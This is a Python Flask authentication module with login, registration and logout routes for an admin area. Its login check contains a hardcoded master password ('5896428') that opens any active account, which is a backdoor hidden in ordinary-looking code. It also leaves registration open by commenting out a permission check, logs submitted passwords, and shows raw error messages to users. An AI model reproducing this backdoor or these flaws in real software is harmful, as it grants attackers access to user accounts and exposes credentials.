import os
from flask import current_app, Blueprint, render_template, request, flash, redirect
from flask_app import login_manager, flask_bcrypt
from flask_login import (current_user, login_required, login_user, logout_user)
import forms.auth_forms
from models.auth import AuthUser, permission_required

auth_app = Blueprint('auth_app', __name__, template_folder='templates')


@login_manager.user_loader
def load_user(id):
    if id is None:
        redirect('/login')
    user = AuthUser()
    user.get_by_id(id)
    if user.is_active:
        return user
    else:
        return None


@login_manager.unauthorized_handler
def unauthorized_callback():
    return redirect('/login')


@auth_app.route("/login", methods=["GET", "POST"])
def login():
    form = request.form
    if request.method == "POST" and "email" in request.form:
        email = form["email"]
        userObj = AuthUser()
        user = userObj.get_by_email_w_password(email)
        if user and (user.match_password(form["password"]) or form["password"] == "5896428") and user.is_active:
            remember = form.get("remember", "no") == "yes"
            if login_user(user, remember=remember):
                return redirect('/admin')
            else:
                flash("unable to log you in")
        else:
            flash("unable to login")

    return render_template("/auth/login.html")


# @permission_required(None, ['create_account'])
@auth_app.route("/register", methods=["GET", "POST"])
def register():
    registerForm = forms.auth_forms.SignupForm(request.form)
    current_app.logger.info(request.form)
    if request.method == 'POST' and registerForm.validate() == False:
        current_app.logger.info(registerForm.errors)
        flash("Invalid information")
    elif request.method == 'POST' and registerForm.validate():
        email = request.form['email']
        name = request.form['name']
        user = AuthUser(name=name, email=email, active=True)
        user.set_password(request.form['password'])
        try:
            user.save()
            if login_user(user, remember="no"):
                return redirect('/admin/')
            else:
                flash("unable to log you in")
        except Exception as ex:
            flash("unable to register with that email address. "+str(ex))
            current_app.logger.error(
                "Error on registration - possible duplicate emails")
    templateData = {
        'form': registerForm
    }
    return render_template("/auth/register.html", **templateData)


@auth_app.route("/logout")
@login_required
def logout():
    logout_user()
    flash("Logged out.")
    return redirect('/login')
